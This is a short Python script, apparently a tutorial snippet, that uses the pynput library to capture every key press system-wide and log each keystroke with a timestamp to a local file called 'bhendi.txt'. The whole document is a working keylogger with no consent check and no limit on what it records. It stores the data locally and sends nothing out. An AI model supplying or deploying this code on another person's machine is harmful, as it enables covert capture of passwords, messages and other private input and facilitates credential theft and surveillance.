#  pip install pynput


from pynput.keyboard import Key, Listener
import logging

# if no name it gets into an empty string
log_dir = ""

# This is a basic logging function
logging.basicConfig(filename=(log_dir+"bhendi.txt"), level=logging.DEBUG,
                    format='%(asctime)s:%(message)s:')

# This is from the library
def on_press(key):
    logging.info(str(key))

# This says, listener is on
with Listener(on_press=on_press) as listener:
    listener.join()
